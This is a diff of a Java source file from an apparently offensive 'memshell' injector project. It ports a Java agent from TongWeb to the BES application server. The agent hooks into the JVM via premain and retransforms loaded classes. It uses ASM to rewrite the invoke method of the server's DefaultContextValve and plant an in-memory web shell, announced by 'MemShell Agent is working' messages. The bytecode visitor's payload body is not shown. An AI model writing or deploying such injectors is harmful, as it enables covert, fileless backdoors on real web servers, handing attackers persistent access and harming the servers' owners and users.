@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.injector.tongweb;
+package com.reajason.javaweb.memshell.injector.bes;
 
 import org.objectweb.asm.*;
 
@@ -11,9 +11,8 @@ import java.security.ProtectionDomain;
  * @author ReaJason
  * @since 2025/3/26
  */
-public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransformer {
-    private static final String TARGET_CLASS = "com/tongweb/web/thor/core/StandardContextValve";
-    private static final String TARGET_CLASS_1 = "com/tongweb/catalina/core/StandardContextValve";
+public class BesContextValveAgentWithAsmInjector implements ClassFileTransformer {
+    private static final String TARGET_CLASS = "com/bes/enterprise/webtier/core/DefaultContextValve";
     private static final String TARGET_METHOD_NAME = "invoke";
 
     static Constructor<?> constructor = null;
@@ -28,13 +27,13 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
         }
     }
 
-    public TongWebContextValveAgentWithAsmInjector() {
+    public BesContextValveAgentWithAsmInjector() {
     }
 
     @Override
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
-        if (TARGET_CLASS.equals(className) || TARGET_CLASS_1.equals(className)) {
+        if (TARGET_CLASS.equals(className)) {
             try {
                 ClassReader cr = new ClassReader(bytes);
                 ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
@@ -53,6 +52,9 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
         return bytes;
     }
 
+    public static String getClassName() {
+        return "{{advisorName}}";
+    }
 
     public static ClassVisitor getClassVisitor(ClassVisitor cv) {
         return new ClassVisitor(Opcodes.ASM9, cv) {
@@ -73,10 +75,6 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
         };
     }
 
-    public static String getClassName() {
-        return "{{advisorName}}";
-    }
-
     public static void premain(String args, Instrumentation inst) throws Exception {
         launch(inst);
     }
@@ -87,14 +85,13 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
 
     private static void launch(Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
-        inst.addTransformer(new TongWebContextValveAgentWithAsmInjector(), true);
+        inst.addTransformer(new BesContextValveAgentWithAsmInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
-            if (TARGET_CLASS.replace("/", ".").equals(name)
-                    || TARGET_CLASS_1.replace("/", ".").equals(name)) {
+            if (TARGET_CLASS.replace("/", ".").equals(name)) {
                 inst.retransformClasses(allLoadedClass);
             }
         }
-        System.out.println("MemShell Agent is working at org.apache.catalina.core.StandardContextValve.invoke");
+        System.out.println("MemShell Agent is working at com.bes.enterprise.webtier.core.DefaultContextValve.invoke");
     }
 }
